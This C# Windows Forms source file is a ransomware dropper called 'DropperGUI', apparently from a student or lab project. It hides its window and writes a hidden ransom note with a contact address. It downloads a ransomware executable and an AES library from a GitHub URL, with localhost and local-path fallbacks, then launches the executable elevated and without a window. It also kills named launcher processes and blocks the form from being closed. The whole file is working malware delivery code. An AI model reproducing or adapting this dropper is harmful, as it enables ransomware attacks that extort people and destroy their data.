using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Diagnostics;
using System.IO;

namespace Dropper
{
    public partial class DropperGUI : Form
    {
        // Data members
        ///< summary>
        /// Reperesents the path where the virus will be loaded into and operates.
        ///</summary>
        private static String pathToInfect = @"C:\Virus_Test";
        static Process p = new Process();
        /// <summary>
        /// Creates a new instance of the ransomware virus dropper.
        /// </summary>
        /// 
       static bool flag = false;
        public DropperGUI()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor; // Make invisible
            p.StartInfo.Arguments = "";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.Verb = "runas";

        }
        private void StartAction()
        {
            // Create Folder
            Directory.CreateDirectory(pathToInfect + @"\Malware");
            // Add the signature file if not exist
            var directoryInfected = File.Exists(pathToInfect + @"\Malware\README.txt");
            if (!directoryInfected)
            {
                StreamWriter writer =
                    new StreamWriter(pathToInfect + @"\Malware\README.txt");
                writer.Write("You were encrypted by Ali & Leen...you can contact  us via ali.ibrahim.2@Lit-co.net");
                File.SetAttributes(pathToInfect + @"\Malware\README.txt",
                                   FileAttributes.Hidden);
            }
            String link = "https://github.com/AliIbrahim996/RansomwareProject/blob/main/build/UI/Debug/Ransomeware.exe", 
            link2 = "https://github.com/AliIbrahim996/RansomwareProject/blob/main/build/UI/Debug/AES.dll";
            DownLoadFileInBackground2(link, pathToInfect + @"\Malware\Ransomeware.exe",link2,@"\Malware\AES.dll");
            // After finishing the downloading, start the ransomware virus and terminate
            if (!flag)
            {
                p.StartInfo.FileName = pathToInfect + @"\Malware\Ransomeware.exe";
                p.Start();
            }

            kill();
            p.WaitForExit();
            Environment.Exit(0);
        }

        private static void kill()
        {
            
            Process[] _process = null;
            _process = Process.GetProcessesByName("DCQPKX"); //kill laucher
            foreach (Process proces in _process)
            {
                proces.Kill();
            }

            Process[] _process2 = null;
            _process2 = Process.GetProcessesByName("._cache_DCQPKX"); //If exist cache virus file, kill too
            foreach (Process proces2 in _process2)
            {
                proces2.Kill();
            }
        }
        // DownLoadFileInBackground2
        public static void DownLoadFileInBackground2(string address1,String path1, string address2, string path2)
        {
            try
            {
                // Make protocol for donwload file from github
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                WebClient client = new WebClient();
                Uri uri = new Uri(address1);
                // Call DownloadFileCallback2 when the download completes.
                client.DownloadFileCompleted +=
                    new AsyncCompletedEventHandler(DownloadFileCallback2);
                // Specify a progress notification handler here ...
                client.DownloadFile(uri,path1);
                uri = new Uri(address2);
                client.DownloadFile(uri, path2);
            }
            catch (Exception e)
            {
                DownLoadLocalFileInBackground();
            }
        }
        private static void DownloadFileCallback2(object sender,
                                                  AsyncCompletedEventArgs e)
        {
            try
            {
                if (e.Cancelled)
                {
                    Console.WriteLine("File download cancelled.");
                    DownLoadLocalFileInBackground();
                }

                if (e.Error != null)
                {
                    Console.WriteLine(e.Error.ToString());
                }
            }
            catch (Exception ex)
            {
                DownLoadLocalFileInBackground();
            }
        }
        public static void DownLoadLocalFileInBackground()
        {

            try
            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile("127.0.0.1:8080",
                                       pathToInfect + @"\Malware\Ransomeware.exe");
                webClient.DownloadFile("127.0.0.1:8080",
                                      pathToInfect + @"\Malware\AES.dll");
            }
            catch (Exception e)
            {
                LaunchLocally();
            }
        }

        private static void LaunchLocally()
        {
            p.StartInfo.FileName = @"C:\local\bin\Ransomeware.exe";
            Console.WriteLine(p.StartInfo.FileName);
            p.Start();
            flag = true;
            kill();
            Console.WriteLine("virus started!");
            
        }

        private void DropperGUI_FormClosing(object sender, FormClosingEventArgs e)
        {
            //anti_Kill
            e.Cancel = true;
        }

        private void DropperGUI_Load(object sender, EventArgs e)
        {

            StartAction();
        }
    }
}
